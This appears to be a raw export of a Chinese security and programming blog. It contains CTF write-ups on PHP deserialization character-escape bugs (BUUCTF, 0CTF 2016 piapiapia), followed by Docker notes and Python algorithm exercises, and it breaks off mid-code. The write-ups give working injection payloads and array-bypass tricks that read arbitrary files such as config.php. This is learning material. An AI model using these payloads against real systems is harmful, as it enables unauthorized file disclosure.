反序列化字符逃逸漏洞总结字符逃逸是通过对生成的反序列化字符串进行字符数量不等的变化，从而使得部分属性统计数目不正确，但是通过一些优美的构造填补一些字符可以使其通过检测并且符合反序列化的语法，从而造成对象注入等漏洞，填补的字符处可以用来对象注入。 总之一句话 漏洞成因：替换改变了反序列化字符串的长度 漏洞类型其实也就两种 替换导致了反序列化字符串变长 替换导致了反序列化字符串变短 分开来看 1.替换导致了反序列化字符串变长替换导致反序列化字符串变长，即可把替换点后面的部分字符串挤出，使得本属性值的部分字符串逃逸出来，精准构造后通过检测且符合反序列化的语法。（通常情况下，我们对插入字符串的点进行替换操作） 例如 [[0CTF 2016]piapiapia](./[0CTF 2016]piapiapia) 2.替换导致了反序列化字符串变短替换导致了反序列化字符串变短，即可把替换点后面的部分字符串吞入，使得后面值字符串中构造的部分字符串逃逸出来，精准构造后通过检测且符合反序列化的语法。（通常情况下，我们对插入字符串的点前面的属性进行替换操作） 例如 本题 0x02 本题的基于源码的本分析题目友好，直接高亮源码 1234567891011121314151617181920212223242526272829303132333435363738394041 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here! #查看发现flag在d0g3_f1ag.php#base64编码后 ZDBnM19mMWFnLnBocA==&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 分析逻辑也较为简单，post传参extract为程序的变量键和值 最终对$_SESSION进行了filter函数过滤并进行了反序列化操作,并且file_get_contents了反序列完成后数组的img键所对应的值，显然，该值是文件名字符串 我们要覆盖img键值对，从而实现任意文件读取漏洞 我们看一下filter函数 12345function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125; 对黑名单数组中的值进行了替换，从而打乱的反序列化字符串自身的结构 容易联想反序列化字符逃逸漏洞 0x03 反序列化字符逃逸漏洞利用很明显，本题属于替换导致了反序列化字符串变短 extract($_POST); 通过此函数我们可以post传入 _SESSION[]= 形式的数据从而使得SESSION数组中增加了成对的键和值 12345$_SESSION[&#x27;user&#x27;]=&#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;]=&#x27;show_image&#x27;;$_SESSION[&#x27;M0th&#x27;]=&#x27;hahaha&#x27;; #此处相当于假设我们post传参为 _SESSION[M0th]=&#x27;hahaha&#x27;$_SESSION[&#x27;img&#x27;]=base64_encode(&#x27;guest_img.png&#x27;);echo serialize($_SESSION); 反序列化字符串格式如下 a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:4:&quot;M0th&quot;;s:6:&quot;hahaha&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 那么我们可以通过构造M0th键名覆盖掉值字符串中的一部分，从而使得值字符串中的另一部分逃逸出来 显然我们需要的img如下这种形式&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 那么不妨 1$_SESSION[&#x27;M0th&#x27;]=&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&#x27;; 反序列化字符串为 1a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:4:&quot;M0th&quot;;s:41:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 我们要通过构造M0th键名去吞入掉这一部分 那么 即可构造为 M0thphpflag 即 1$_SESSION[&#x27;M0thphpflag&#x27;]=&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&#x27;; a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:11:&quot;M0th&quot;;s:41:&quot;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 数组中键和值应该成对存在，所以应该在构造出来一个值，即为 1$_SESSION[&#x27;M0thflagphp&#x27;]=&#x27;;s:6:&quot;img111&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&#x27;; 所以post传入 _SESSION[M0thflagphp]=’;s:6:”img111”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}’","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"buuctf-web刷题记录","slug":"buuctf-web刷题记录","date":"2021-01-01T15:20:50.000Z","updated":"2021-03-03T15:34:14.021Z","comments":true,"path":"2021/01/01/buuctf-web刷题记录/","link":"","permalink":"http://m0th.top/2021/01/01/buuctf-web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"在buuctf上做一些了，但是只记录了一部分，有时候用到的一些点也因为没有记录而忘记，于是有把做过没记录的题，重新做了一下，并且打算把在buu上做的web题的记录连接整理到一起，还有misc","text":"在buuctf上做一些了，但是只记录了一部分，有时候用到的一些点也因为没有记录而忘记，于是有把做过没记录的题，重新做了一下，并且打算把在buu上做的web题的记录连接整理到一起，还有misc WEB [HCTF 2018]WarmUp [极客大挑战 2019]EasySQL [强网杯 2019]随便注 [极客大挑战 2019]Havefun [SUCTF 2019]EasySQL [ACTF2020 新生赛] [极客大挑战 2019]Secret File [极客大挑战 2019]LoveSQL [GXYCTF2019]Ping Ping Ping [ACTF2020 新生赛]Exec [护网杯 2018]easy_tornado [极客大挑战 2019]Knife [RoarCTF 2019]Easy Calc [极客大挑战 2019]Http [极客大挑战 2019]PHP [极客大挑战 2019]Upload [极客大挑战 2019]BabySQL [ACTF2020 新生赛]Upload [ACTF2020 新生赛]BackupFile [HCTF 2018]admin [极客大挑战 2019]BuyFlag [SUCTF 2019]CheckIn [BJDCTF2020]Easy MD5 [ZJCTF 2019]NiZhuanSiWei MISC 签到","categories":[{"name":"ctf-Write up","slug":"ctf-Write-up","permalink":"http://m0th.top/categories/ctf-Write-up/"}],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"[0CTF 2016]piapiapia","slug":"0CTF-2016-piapiapia","date":"2020-12-09T09:00:22.000Z","updated":"2021-01-08T02:53:09.899Z","comments":true,"path":"2020/12/09/0CTF-2016-piapiapia/","link":"","permalink":"http://m0th.top/2020/12/09/0CTF-2016-piapiapia/","excerpt":"一道不算很难的源码分析题，主要考点在让过strlen()函数以及反序列化字符逃逸","text":"一道不算很难的源码分析题，主要考点在让过strlen()函数以及反序列化字符逃逸 0x01 信息收集 登入框，测试sql注入以及万能密码无果 扫下目录 源码包泄露，显然是一道代码审计题 审一遍整体逻辑，发现了可能存在的漏洞点，即为任意文件包含漏洞 0x02 漏洞分析123456789101112131415161718192021222324252627282930313233343536373839404142//反序列化 $profile $profile = unserialize($profile);//$profile 来自$profile=$user-&gt;show_profile($username);//user 是一个类对象，查看class.phppublic function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125;//回溯父类中的filter函数 public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125;//回溯父类中的select函数 public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125;//很明显$profile的值原来在数据库里保存//同时我们发现update函数可以把输入写入数据库中，我们追溯调用update函数的地方public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125;//在子类中update_profile函数调用了父类的update函数，全局搜索update_profile函数的调用位置$user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;//在update.php中有了发现 我们来分析update.php中的源码 123456789101112131415161718192021222324if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); false null if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); //此处过滤方法和其他有些许区别，使用了strlen函数 $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; 很明显在nickname变量处有一个strlen函数，我们知道在php黑魔法中strlen函数在处理数组时会返回null tricks 123456789var_dump(preg_match(&quot;&quot;,array()));var_dump(strlen(array()));var_dump(strlen(array())&gt;10);if(preg_match(&quot;&quot;,array())||strlen(array()) &gt; 10)&#123; echo &#x27;no bypass&#x27;;&#125;else&#123; echo &#x27;bypass&#x27;;&#125;#bool(false) NULL bool(false) bypass 从而使得nickname为可控变量 显然到了这里，就是通过反序列化的方式逃逸出来photo变量，使任意文件包含漏洞成立 0x03漏洞利用明显的反序列化字符逃逸 模拟上图源码进行构造发序列化字符串 我们发现在中间写入数据库的代码中调用了filter方法 123456789public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; 发现where会被替换为hacker从而可以逃逸一个字符 我们想要构造photo变量去读取config.php文件 反序列化一下即为==”;}s:5:”photo”;s:10:”config.php”;}== 这是需要拼接的字符串，一共34个字符，where替换为hacker逃逸一个字符 那么需要34个where 从而 123456$profile[&#x27;phone&#x27;] = &#x27;123&#x27;;$profile[&#x27;email&#x27;] = &#x27;123@qq.com&#x27;;$profile[&#x27;nickname&#x27;][]= &#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;;$profile[&#x27;photo&#x27;] = &#x27;asdfasdf&#x27;;echo serialize($profile);echo strlen(&#x27;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;); nickname为 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;} 0x04简单的数组绕过知识总结 1234567md5(Array()) = nullsha1(Array()) = null ereg(pattern,Array()) = nullpreg_match(pattern,Array()) = falsestrcmp(Array(), &quot;abc&quot;) = nullstrpos(Array(),&quot;abc&quot;) = nullstrlen(Array()) = null","categories":[],"tags":[{"name":"ctf-web","slug":"ctf-web","permalink":"http://m0th.top/tags/ctf-web/"}]},{"title":"docker从入门到精通(三)","slug":"docker从入门到精通-三","date":"2020-12-01T13:21:15.000Z","updated":"2021-03-26T09:45:02.096Z","comments":true,"path":"2020/12/01/docker从入门到精通-三/","link":"","permalink":"http://m0th.top/2020/12/01/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%89/","excerpt":"docker原理和docker的核心技术","text":"docker原理和docker的核心技术 Docker镜像加载原理 UnionFS（联合文件系统） UnionFS 联合文件系统（Union File System）：2004年由纽约州立大学石溪分校开发，它可以把多个目录(也叫分支)内容联合挂载到同一个目录下，而目录的物理位置是分开的。UnionFS允许只读和可读写目录并存，就是说可同时删除和增加内容。UnionFS应用的地方很多，比如在多个磁盘分区上合并不同文件系统的主目录，或把几张CD光盘合并成一个统一的光盘目录(归档)。另外，具有写时复制(copy-on-write)功能UnionFS可以把只读和可读写文件系统合并在一起，虚拟上允许只读文件系统的修改可以保存到可写文件系统当中。 特性:一次同时加载多个文件系统，但从外面看，只能看到一个文件系统，联合加载会把各层文件系统的叠加在一起，最终的文件系统会包括所有的底层文件和目录 docker镜像加载原理 docker的镜像实际是一层一层的文件系统组成，这种文件系统被称为unionFS bootfs(boot file system)主要包括bootloader和kernel，bootloader 主要是加载引导kernel，linux启动时会加载bootfs文件系统，在Docker镜像的最底层就是bootfs。 rootfs(root file system),在bootfs之上。包含的就是典型的linux系统中的/dev,/proc,/bin,etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如ubuntu、centos等。 对于一个精简的OS,rootfs可以很小，只需要包含最基本的命令工具程序库即可。所以容器更轻便！ Docker分层理解 分层的镜像 我们可以去下载一个镜像，注意下载的日志输出，可以看到是一层一层的在下载！ 1docker image inspect redis 理解： 所有的Docker镜像都起始于一个基础镜像成，当进行修改或者增加新的内容时，就会在当前镜像层之上，创新新的镜像层。 如下图所示，该镜像包含三个镜像层 在添加额外的镜像层的同时，镜像始终保持当前镜像的组合。下图中有一个简单的例子，每个镜像曾包含是哪个文件，而镜像包含了来自两个镜像层的六个文件 上图的镜像层跟之前图中的略有区别，主要目的是便于展示文件 下图展示一个稍微复杂的三层镜像，在外部看来整个镜像只要六个文件，这是因为最上层的文件7是文件5的一个更新版本。 这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到了镜像当中。Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈。并保证多镜像对外展示位同一的文件系统。 Docker 在windows 上仅支持windowsfilter一种储存引擎，改引擎基于NTFS文件系统之上实现了分层和CoW[1]。 下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供同一的试图。 特点 Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！ 这一层就是我们通常说的容器层，容器之下的都叫镜像层！ Commit镜像 12docker commit 提交容器成为一个新的副本 docker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器id 目标镜像名:[TAG] 实战测试1234567#启动一个默认的tomcat#发现默认的tomcat 没有webapps应用，镜像的原因，官方镜像默认webapps下面没有文件#自己拷贝进去基本文件#将我们操作过的容器通过commit提交为一个镜像！我们以后使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像 容器数据卷 什么是容器数据卷 docker的理念回顾 将应用和环境打包成一个镜像！ 数据？如果数据都存在容器中，容器删除，数据就会丢失！需求：数据可以持久化 mysql，容器删了，删库跑路！需求：mysql数据存储在本地！ 容器之间可以有一个数据共享的技术！Docker 容器中产生的数据，同步到本地！ 这就是卷！容器目录挂载在linux下 总之：容器的持久化和同步操作！容器间也是可以数据共享的！ 数据卷挂载 1234docker run -it -v 主机目录：容器内目录#测试[root@iZ8vbgt047thtwcw9p956rZ ~]# docker run -it -v /root/test:/home centos /bin/bash#启动起来后可以通过docker inspect 容器id 测试文件的同步 实战：安装mysql 1docker run -d -p 3310:3306 -v /root/mysql/conf:/etc/mysql/conf.d -v /root/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7 当我删掉容器时 数据依然保留，实现了容器数据的持久化 匿名挂载和具名挂载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#匿名挂载docker run -d -P --name nginx01 -v /etc/nginx nginx#查看卷情况[root@iZ8vbgt047thtwcw9p956rZ data]# docker volume lsDRIVER VOLUME NAMElocal 0a7651f5e9f81607e4f88ca18d991db80332cdc82c66ece4825349cd0388e9b8local 1d9fa7581cdaa18b34c3a9956fb096b5ed4a78a4263fe6d46428c44511c53df1local 2a87524ba70a0c21e8bf272c5d8fa3bc9b2c103af78d781d24b4769f5ce0ef8flocal 3ad8d08c7e4b1d7fa3cba6cece2a1eb79b59d44bc60cb262f86323d57db0b9b5local 4d4b6214177e35d247d25d5667c2a5455b1ae288c894e013d17e831c58e41323local 5e6020d6a6257ce27d3f97e5a2db9cdc9677022fa13e1a9b2bee06568c5933fdlocal 26babbcf4b2443c6e88b143fa1d7d32044d45afeefe0c7fbe8ecffb3f000a71dlocal 82d0e1f8fd164f3530f3ae7d0692142ba09245bcb0781cea9a45883c75ec4c8flocal 92fed24888df0c636e8192a0ec8debad711760321c5269a343376069cb85c232local 100a539e9ff150910d86bef2c68633be15aad3ac08f7d4b987cfee765de1c1d0local 382fa3a6549d2a2511ed14fdf7e297b96bc65a8fb0c107b8538ada40f30801cclocal 602e762594674a6c71c9e68111fea7e6f9d6fe92463fc7d0c0387383b9a73e2blocal 628d9c3b0e80db81b519ad9dec3d3e9db22fcdd82b48f3cb0152d64f718875d0local 5025f1c0a862f14b2581db6ebb0e6c7b012854c79c0ec149cf3438ea42050313local 6383a5b1ec44bee9fdf5df32f0d7880a3c890a4b48b9e66a0af7d54346e47495local 8166df1dec997e2970267bac900090cdbf6d4a79f26b01c8b258a9981d14edc1#具名挂载#通过 -v 卷名：容器内路径docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx#查看卷情况docker volume lslocal 4207549652c2493cfa6864c8329304fd31866595c81457d3908aeccdc1fe7317local a589b7c33fad1bec8dda93aeec2b3ff41e9075787a73f9c4fa5d015e8f6f7afelocal b45178f0142bb2ba08a16ce9ae36a083e73c0d3721ab53140d6a5ec976afa190local juming-nginx#查看该卷的详细信息[root@iZ8vbgt047thtwcw9p956rZ data]# docker volume inspect juming-nginx[ &#123; &quot;CreatedAt&quot;: &quot;2020-12-03T20:15:21+08:00&quot;, &quot;Driver&quot;: &quot;local&quot;, &quot;Labels&quot;: null, &quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/juming-nginx/_data&quot;, &quot;Name&quot;: &quot;juming-nginx&quot;, &quot;Options&quot;: null, &quot;Scope&quot;: &quot;local&quot; &#125;]#docker工作目录[root@iZ8vbgt047thtwcw9p956rZ docker]# lsbuilder buildkit containers image network overlay2 plugins runtimes swarm tmp trust volumes[root@iZ8vbgt047thtwcw9p956rZ docker]# pwd/var/lib/docker 所有的docker容器内的卷，没有指定目录的情况下/var/lib/docker/volumes/xxx/_data 我们通过具名挂载可以方便的找到我们的一个卷，大多数情况在使用的具名挂载 1234#如何确定是具名挂载还是匿名挂载，还是指定路径挂载-v 容器内路径 #匿名挂载-v 卷名：容器内路径 #匿名挂载-v /宿主机绝对路径：容器内路径 #指定路径下载 拓展： 1234567#通过 -v 容器内路径：ro rw 改变读写权限ro readonly # 只读rw readwrite #可读可写#一旦这个设置了容器权限，容器对我们挂载出来的内容就有限定了docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginxdocker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx#ro 要看到 ro就说明这个路径只能通过宿主机来操作了，容器内部不可操作 初识Dockerfile Dockerfile就是用来构建docker镜像的构建文件！命令脚本！ 通过这个脚本可以生成镜像，一层一层的，脚本一个个 的命令，每一个命令都是一层 构建一个简单的镜像 1234567#创建一个dockerfile文件，名字可以修改#文件中的内容 指令（大写） 参数FORM centosVOLUME [&quot;volume01&quot;,&quot;volume02&quot;]CMD echo &quot;----end----&quot;CMD /bin/bash#每一个命令都是镜像的一层 匿名挂载，查一下卷挂载的路径 假设构建镜像的时候没有挂载卷，要通过-v手动挂载数据卷，-v 卷名：容器内路径 容器数据卷 多个mysql同步数据！可以通过同步数据卷来实现。 123456#讲上面我们构造的centos镜像 run起来docker run -it --name docker01 moth/centos /bin/bash#在 volume01下touch一个文件 touch docker01#通过 --volumes-from docker01 同步卷到docker02docker run -it --name docker02 --volumes-from docker01 moth/centos /bin/bash 1234567#测试：可以删除docker01，查看一下docker02和docker03是否还可以访问这个文件#测试依然可以访问[root@iZ8vbgt047thtwcw9p956rZ test]# docker rm -f docker01docker01[root@iZ8vbgt047thtwcw9p956rZ test]# docker attach docker02[root@d7754b493f3d volume01]# lsdocker01 多个mysql实现数据共享 123docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456--name mysql01 mysql:5.7 docker run -d -p 3310:3306 --volumes-from docker01 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 mysql:5.7 结论： 容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止。 但是一旦持久化到了本地， 这个时候，本地的数据是不会删除的！","categories":[{"name":"linux运维","slug":"linux运维","permalink":"http://m0th.top/categories/linux%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://m0th.top/tags/docker/"}]},{"title":"算法入门--读心术之信息编码","slug":"算法入门-读心术之信息编码","date":"2020-12-01T01:44:49.000Z","updated":"2020-12-01T12:44:03.384Z","comments":true,"path":"2020/12/01/算法入门-读心术之信息编码/","link":"","permalink":"http://m0th.top/2020/12/01/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8-%E8%AF%BB%E5%BF%83%E6%9C%AF%E4%B9%8B%E4%BF%A1%E6%81%AF%E7%BC%96%E7%A0%81/","excerpt":"输入，条件控制，信息编码和解码","text":"输入，条件控制，信息编码和解码 0x01 基本问题及解决 一副扑克牌，任选5张，通过某种特定的规则，有序的展示其中的四张牌。即可猜到仅剩的一张牌的花色和大小 生成一副牌的列表 ‘A_C’ ‘A_D’ ‘A_H’ ‘A_S’ C D H S 表示花色 A 1 2 3 4 5 6 7 8 9 10 J Q K 表示大小 生成代码如下 1234567891011121314151617181920212223242526deck=[&#x27;_&#x27;]*52for i in range(52): if i%4==0: deck[i]=deck[i]+&#x27;C&#x27; elif i%4==1: deck[i]=deck[i]+&#x27;D&#x27; elif i%4==2: deck[i]=deck[i]+&#x27;H&#x27; elif i%4==3: deck[i]=deck[i]+&#x27;S&#x27; if i%13==0: deck[i]=&#x27;A&#x27;+deck[i] for j in range(1,9): if i%13==j: deck[i]=chr(ord(&#x27;1&#x27;)+j)+deck[i] if i%13==9: deck[i]=&#x27;10&#x27;+deck[i] if i%13==10: deck[i]=&#x27;J&#x27;+deck[i] if i%13==11: deck[i]=&#x27;Q&#x27;+deck[i] if i%13==12: deck[i]=&#x27;K&#x27;+deck[i]print(deck)#输出结果为：[&#x27;A_C&#x27;, &#x27;2_D&#x27;, &#x27;3_H&#x27;, &#x27;4_S&#x27;, &#x27;5_C&#x27;, &#x27;6_D&#x27;, &#x27;7_H&#x27;, &#x27;8_S&#x27;, &#x27;9_C&#x27;, &#x27;10_D&#x27;, &#x27;J_H&#x27;, &#x27;Q_S&#x27;, &#x27;K_C&#x27;, &#x27;A_D&#x27;, &#x27;2_H&#x27;, &#x27;3_S&#x27;, &#x27;4_C&#x27;, &#x27;5_D&#x27;, &#x27;6_H&#x27;, &#x27;7_S&#x27;, &#x27;8_C&#x27;, &#x27;9_D&#x27;, &#x27;10_H&#x27;, &#x27;J_S&#x27;, &#x27;Q_C&#x27;, &#x27;K_D&#x27;, &#x27;A_H&#x27;, &#x27;2_S&#x27;, &#x27;3_C&#x27;, &#x27;4_D&#x27;, &#x27;5_H&#x27;, &#x27;6_S&#x27;, &#x27;7_C&#x27;, &#x27;8_D&#x27;, &#x27;9_H&#x27;, &#x27;10_S&#x27;, &#x27;J_C&#x27;, &#x27;Q_D&#x27;, &#x27;K_H&#x27;, &#x27;A_S&#x27;, &#x27;2_C&#x27;, &#x27;3_D&#x27;, &#x27;4_H&#x27;, &#x27;5_S&#x27;, &#x27;6_C&#x27;, &#x27;7_D&#x27;, &#x27;8_H&#x27;, &#x27;9_S&#x27;, &#x27;10_C&#x27;, &#x27;J_D&#x27;, &#x27;Q_H&#x27;, &#x27;K_S&#x27;] 通过编程我们先来模拟助手的工作 此种发牌利用的数学原理为 如果将13张牌环路程一个闭环，那么任何两张牌之间的距离都可以用1跳到6跳来表示，有时候顺时针跳数可能为7但是逆时针跳数就必然为6 按照52张牌(去掉大小王)排序法，按点数排序从小到大，相同大小时，假设每一张牌花色中的梅花小于方片小于红桃小于黑桃，这样我们就把52张牌排序成功 根据抽屉原理，四种花色五张牌，则必然有相同花色的牌 这样根据以上三条规律，即可推算出助手的工作方法 首先找出同花色的两张牌，跟魔术师提前沟通好都按顺时针来跳牌，通过判断这两张牌的顺时针距离小于等于6跳，来决定被猜牌为哪一个，基准牌为另一个，基准牌为第一个展示的牌，同时根据剩下的三张牌 按照 （小，中，大）=1 （小，大，中）=2 （中，小，大）=3 （中，大，小）=4 （大，小，中）=5 （大，中，小）=6 通过展示剩余三张牌的顺序即可暗示魔术师跳数 通过代码实现 1deck","categories":[{"name":"用python解决算法谜题","slug":"用python解决算法谜题","permalink":"http://m0th.top/categories/%E7%94%A8python%E8%A7%A3%E5%86%B3%E7%AE%97%E6%B3%95%E8%B0%9C%E9%A2%98/"}],"tags":[{"name":"算法入门","slug":"算法入门","permalink":"http://m0th.top/tags/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"}]},{"title":"算法入门--时间选择","slug":"算法入门——时间选择","date":"2020-11-30T00:59:33.000Z","updated":"2020-11-30T03:03:08.149Z","comments":true,"path":"2020/11/30/算法入门——时间选择/","link":"","permalink":"http://m0th.top/2020/11/30/%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E9%80%89%E6%8B%A9/","excerpt":"元组、元组列表、for循环、浮点数、列表切片、排序等等","text":"元组、元组列表、for循环、浮点数、列表切片、排序等等 0x01 基本问题及解决给出人们出席会议的时间，求在某一时间内出席人数最多的时间段和人数 反复检查时间 1234567891011121314151617181920212223242526272829303132sched=[(6,8),(6,12),(6,7),(7,8), (7,10),(8,9),(8,10),(9,12), (9,10),(10,11),(10,12),(11,12)]def bestTimeToPart(schedule): start,end=celebrityTimeLong(schedule) count=celebrityDenisity(schedule,start,end) maxcout=0 print(count) for i in range(start,end+1):#&lt;--对此可以进行优化如下 if count[i]&gt;maxcout: maxcout=count[i] time=i print(&#x27;The best time to attend the party is 